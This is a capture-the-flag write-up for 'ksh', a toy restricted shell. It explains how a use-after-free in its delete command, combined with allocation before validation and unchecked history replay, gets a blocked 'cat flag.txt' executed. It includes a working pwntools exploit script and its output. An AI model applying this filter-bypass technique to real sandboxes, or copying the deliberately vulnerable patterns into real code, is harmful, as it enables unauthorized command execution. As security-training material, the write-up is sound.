# ksh — Pwn Writeup
## Author : BLD933

## Overview

| | |
|---|---|
| **Challenge** | ksh v1.1 — a restricted shell ("release build @bld_mhd") |
| **Category** | Pwn / Heap UAF + Logic |
| **Binary** | `ksh` — ELF 64-bit, **no PIE**, not stripped (full source `ksh.c`/`ksh.h`) |
| **Flag** | `flag{bld_mhd}` |

```
$ checksec ksh
    PIE      : NO
    RELRO    : PARTIAL
    NX       : ENABLED
    Canary   : NO
```

## The Program

A mini shell that only executes **whitelisted** commands:

```c
const char* whitelist[] = { "cd", "history", "delete", "help", "ls",
                            "cat", "echo", "!", "id", "whoami",
                            "clear", "cwd", "pwd" };
```

The main loop per input line:

```c
input = read_input();                  // malloc'd copy of the line
if (check_command(input) < 0) continue; // 1) whitelist + flag-path check
res = execute_command(&history, input); // 2) run builtin or execvp
add_command(&history, input);           // 3) store pointer in history
```

### Defense 1 — the whitelist (`check_command`)

Besides prefix-matching the command name against the whitelist, every argument is checked with `realpath()`:

```c
if (realpath(argv[c], real_path) && strstr(real_path, "flag") != NULL)
    return -1;    // "cat flag.txt" is rejected
```

So even though `cat` is allowed, `cat flag.txt` (or any symlink dance that resolves to a path containing `"flag"`) is blocked.

### Defense 2 — the obvious bug is a decoy

`exec_history` (`!N` / `!!`) re-runs history entries **without re-checking** them — the author even left a sarcastic comment:

```c
// i think its fine to just execute without checking, this will save 0.4ms
return execute_command(history, history->commands[index]);
```

But history only ever contains *approved* commands… unless you can make a history slot point at something that isn't approved. Enter the UAF.

## The Bug — Use-After-Free in `delete`

```c
// TODO: clear the free'd pointer, apparently it's causing crashes in release version
int delete_command(CommandHistory* history, const char* input) {
    int index = atoi(input + 7);
    ...
    free(history->commands[index]);   // pointer NOT set to NULL
    return 0;
}
```

`history->commands[index]` is freed but **the dangling pointer stays in the history array**. `view_history` prints entries until `count` (dangling pointer is non-NULL, so it prints freed data), and `!index` will happily `execute_command()` on it.

## Exploit Strategy

The heap grooming is almost free because of another quirk: `read_input()` mallocs the input string **before** `check_command` rejects it:

```c
input = read_input();            // malloc(index+1); strcpy(buffer)
if (check_command(input) < 0) continue;   // blocked input was STILL malloc'd
```

So a rejected line allocates (and leaks — but more importantly for us, *fills*) a heap chunk of exactly the size we want. glibc's tcache will hand the **most recently freed chunk** straight back out for a matching size.

The winning sequence:

```
help                # history[0] = malloc(5)  -> "help"
delete 0            # free(history[0]) — dangling pointer remains
cat flag.txt        # REJECTED by check_command, but read_input already
                    #   malloc(12) and strcpy'd "cat flag.txt" into the
                    #   exact chunk that was just freed (tcache LIFO)
!0                  # exec_history: runs history[0] WITHOUT the check
                    #   -> run_cmd("cat flag.txt") -> execvp -> flag
```

The freed chunk (size class of `"help"` + 1 = 5 bytes → 0x20 chunk) and the new allocation (`"cat flag.txt"` + 1 = 12 bytes → also a 0x20 chunk) are the same tcache bin, so the very next malloc reuses the exact address stored in `history->commands[0]`. The dangling history pointer now aliases the rejected command's buffer.

`!0` then re-parses that memory as a command and `execvp("cat", {"cat","flag.txt"})` runs — no whitelist, no `realpath` check, because `exec_history` trusts history.

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

r = process('./ksh')          # remote(host, port) for the real thing
r.recvuntil(b'$ ')

r.sendline(b'help')           # history[0] -> "help"        (0x20 chunk)
r.recvuntil(b'$ ')

r.sendline(b'delete 0')       # free(history[0]) — UAF, pointer dangles
r.recvuntil(b'$ ')

r.sendline(b'cat flag.txt')   # blocked by realpath filter, BUT read_input
r.recvuntil(b'$ ')            #   already re-used the freed 0x20 chunk

r.sendline(b'!0')             # execute history[0] unchecked -> cat flag.txt

print(r.recvuntil(b'$ ', timeout=3))
```

```
$ python3 solve.py
b'cat flag.txt\nflag{bld_mhd}\n...'
```

The echoed `cat flag.txt` line is `exec_history` printing the command it's about to run, followed by the flag itself.

## Notes / Takeaways

* The challenge is a beautiful chain of **three cooperating weaknesses**:
  1. `free()` without NULLing (the TODO comment even warns you),
  2. allocation *before* validation (`read_input` mallocs even for rejected input),
  3. trusting cached/derived state (`!N` skips validation "to save 0.4ms").
* No memory corruption is needed at all — this is a pure logic + heap-aliasing exploit. The tcache's LIFO behavior makes the reuse deterministic: the very next same-size malloc returns the freed chunk.
* Size matters: the benign history command must land in the same tcache bin as the payload. `"help"` (5 bytes) and `"cat flag.txt"` (12 bytes) both round to a 0x20 chunk. For longer payloads, pad the benign command accordingly.
* The `realpath` + `strstr("flag")` filter is a red herring worth studying: it defeats symlink renames and `./flag.txt`, `flag.txt`, `../flag.txt` etc. — but it only ever guards the *initial* command, never the history path.
